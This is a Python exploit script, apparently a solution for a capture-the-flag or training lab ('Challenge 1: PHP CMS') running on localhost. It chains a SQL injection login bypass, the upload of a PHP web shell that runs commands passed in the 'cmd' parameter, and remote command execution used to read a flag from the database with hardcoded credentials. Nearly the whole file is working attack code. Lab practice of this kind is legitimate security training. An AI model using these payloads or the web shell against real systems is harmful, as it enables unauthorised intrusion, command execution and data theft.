#!/usr/bin/env python3
"""
Exploit script for Challenge 1: PHP CMS
Chains SQL Injection + File Upload + RCE
"""

import requests
import sys
import re

BASE_URL = "http://localhost:8080"

def exploit_sqli_login(session):
    """Exploit SQL injection to login as admin"""
    print("[*] Attempting SQL injection in login...")
    
    login_url = f"{BASE_URL}/login.php"
    data = {
        'username': "admin' OR '1'='1' -- ",
        'password': 'test'
    }
    
    response = session.post(login_url, data=data, allow_redirects=False)
    
    if 'Location' in response.headers and 'index.php' in response.headers['Location']:
        print("[+] Successfully logged in via SQL injection!")
        return True
    else:
        print("[-] SQL injection failed")
        return False

def upload_shell(session):
    """Upload PHP shell"""
    print("[*] Uploading PHP shell...")
    
    upload_url = f"{BASE_URL}/upload.php"
    
    # PHP shell payload
    shell_content = "<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?>"
    
    files = {
        'file': ('shell.php', shell_content, 'application/x-php')
    }
    
    response = session.post(upload_url, files=files)
    
    if 'successfully' in response.text.lower():
        print("[+] Shell uploaded successfully!")
        
        # Extract user_id from session or response
        # In real scenario, we'd need to parse the response or use a different method
        # For now, we'll try common paths
        return True
    else:
        print("[-] File upload failed")
        return False

def execute_command(session, user_id, command):
    """Execute command via uploaded shell"""
    shell_url = f"{BASE_URL}/uploads/{user_id}/shell.php"
    params = {'cmd': command}
    
    response = session.get(shell_url, params=params)
    return response.text

def get_flag_from_db(session, user_id):
    """Get flag from database via RCE"""
    print("[*] Attempting to read flag from database...")
    
    # Try to read flag using mysql command
    cmd = "mysql -u cms_user -pcms_pass cms_db -e 'SELECT secret_flag FROM flags' 2>/dev/null"
    result = execute_command(session, user_id, cmd)
    
    # Alternative: Use PHP to query database
    php_cmd = """php -r "try { $pdo = new PDO('mysql:host=mysql;dbname=cms_db', 'cms_user', 'cms_pass'); $stmt = $pdo->query('SELECT secret_flag FROM flags LIMIT 1'); $row = $stmt->fetch(PDO::FETCH_ASSOC); echo $row['secret_flag']; } catch(Exception $e) { echo $e->getMessage(); }" """
    
    result = execute_command(session, user_id, php_cmd)
    
    # Extract flag
    flag_match = re.search(r'OSWE\{[^}]+\}', result)
    if flag_match:
        return flag_match.group(0)
    
    return None

def main():
    print("=" * 60)
    print("Challenge 1: PHP CMS Exploit")
    print("=" * 60)
    
    session = requests.Session()
    
    # Step 1: SQL Injection
    if not exploit_sqli_login(session):
        print("[-] Failed to exploit SQL injection")
        return
    
    # Step 2: Upload shell
    if not upload_shell(session):
        print("[-] Failed to upload shell")
        return
    
    # Step 3: Execute commands
    # Note: In real scenario, we'd need to determine user_id
    # For demo, assuming user_id = 1 (admin)
    user_id = 1
    
    print(f"[*] Testing RCE with user_id={user_id}...")
    test_result = execute_command(session, user_id, "id")
    print(f"[+] Command execution result: {test_result[:100]}")
    
    # Step 4: Get flag
    flag = get_flag_from_db(session, user_id)
    
    if flag:
        print(f"\n[+] FLAG FOUND: {flag}")
    else:
        print("\n[-] Could not retrieve flag")
        print("[*] Try accessing /admin.php directly after SQL injection login")
    
    # Alternative: Try accessing admin panel
    print("\n[*] Attempting to access admin panel...")
    admin_response = session.get(f"{BASE_URL}/admin.php")
    if 'OSWE{' in admin_response.text:
        flag_match = re.search(r'OSWE\{[^}]+\}', admin_response.text)
        if flag_match:
            print(f"[+] FLAG FOUND in admin panel: {flag_match.group(0)}")

if __name__ == "__main__":
    main()

